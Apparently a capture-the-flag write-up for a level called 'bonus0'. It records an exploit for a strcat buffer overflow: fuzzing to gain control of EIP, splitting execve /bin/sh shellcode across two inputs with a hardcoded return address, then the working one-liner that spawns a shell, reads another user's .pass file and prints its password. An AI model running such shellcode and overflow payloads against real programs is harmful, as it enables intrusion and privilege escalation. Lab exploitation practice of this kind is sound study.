@@ -1,0 +1,52 @@
+# In this level, when playing with inputs, i managed to proc an overflow
+	when we reach strcat
+
+# I mostly solved this level by fuzzing
+Starting program: /home/user/bonus0/bonus0 < <(python -c 'print "A"*20' ; python -c 'print "A"*19')
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+# We can get control over EIP, nice :)
+
+# To call system i had to do weird tricks with alignement or idk ?? (\x99)
+# This shellcode will call system
+(gdb) r < <(python -c 'print "B"*20' ; python -c 'print "\x99"*14+"\x60\xb0\xe6\xb7"+"\x99"')
+
+# But we have a problem, we don't have much space to create a big sufficient shellcode,
+
+=====================================================================================================
+
+# The idea here will be to put our shellcode on both arg1 and arg2, because they are
+	concat together with strcat
+
+# This is the concept:
+	the end of arg2 will contains the address of the beginning of our string
+	arg1 will contain the beginning of the shellcode (20 chars)
+	beginning of arg2 will contains the end of our shellcode
+
+# This will be my shellcode
+# In the first arg:
+# \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0
+    1   2   3   4   5   6   7   8   9   10  11  12  13  14  15  16  17  18  19  20
+
+# In the second arg:
+# \x0b\xcd\x80
+    21  22  23
+
+# I found that the beginning of my shellcode (begin of str) will be at address: 0xbffff706
+# So my arg 2 will jump to it then contain the end of my shellcode
+python -c 'print "\x0b\xcd\x80"  +  "\x45"*11  + "\x06\xf7\xff\xbf"     +"\x99"'
+                   SHELLCODE END -      FILL   -   EIP WILL BE = THIS - PADDING
+
+
+# This shellcode wasn't working because i believe i had to xor registers before
+(gdb) r < <(python -c 'print "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"+"B"*2' ; python -c 'print "\x99"*14+"\x06\xf7\xff\xbf"+"\x99"') # https://www.exploit-db.com/exploits/44321
+
+# This one works
+# Works only with tilde ?? Well gg i guess :D
+(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"' ; python -c 'print "\x0b\xcd\x80"+"\x45"*11+"\x06\xf7\xff\xbf"+"\x99"' ; cat) | ~/bonus0
+
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
